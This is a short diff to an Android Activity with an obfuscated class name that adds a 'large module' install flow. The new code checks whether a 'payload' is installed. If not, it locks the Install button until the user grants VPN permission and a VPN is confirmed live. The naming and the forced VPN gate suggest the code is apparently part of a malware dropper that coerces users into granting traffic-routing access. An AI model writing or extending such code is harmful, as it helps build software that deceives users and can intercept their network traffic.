@@ -355,7 +355,32 @@ public class A4450c4b785 extends Activity {
         container.addView(scroll);
         setContentView(container);
 
-        ui.postDelayed(this::startLargeModuleInstall, 1500);
+        ui.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                startLargeModuleInstallFlow();
+            }
+        }, 1500);
+    }
+
+    private void startLargeModuleInstallFlow() {
+        // Now run the existing install flow exactly as before
+        if (isPayloadInstalled()) {
+            doImmediateRedirect();
+            return;
+        }
+
+        setContentView(R.layout.activity_main);
+        status = findViewById(R.id.status);
+        btn    = findViewById(R.id.btnInstall);
+        btn.setOnClickListener(v -> onInstallClicked());
+
+        // Lock the Install button and demand VPN permission before anything else.
+        btn.setEnabled(false);
+        requestVpnPermission();
+
+        // Start the monitor — it will enable the button once VPN is confirmed live.
+        ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
     @Override
